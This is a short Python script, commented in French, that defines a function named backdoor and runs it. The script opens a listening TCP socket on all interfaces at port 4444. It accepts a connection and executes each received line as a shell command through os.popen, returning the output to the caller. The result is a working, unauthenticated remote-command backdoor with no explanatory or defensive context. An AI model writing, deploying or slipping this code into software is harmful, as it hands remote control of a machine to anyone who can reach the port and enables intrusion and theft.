import socket
import os

def backdoor():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 4444))  # Écoute sur le port 4444
    s.listen(5)
    print("En attente d'une connexion...")
    
    conn, addr = s.accept()
    print(f"Connexion établie par {addr}")

    while True:
        command = conn.recv(1024).decode()
        if command.lower() == 'exit':
            break
        output = os.popen(command).read()
        conn.send(output.encode())

    conn.close()

if __name__ == "__main__":
    backdoor()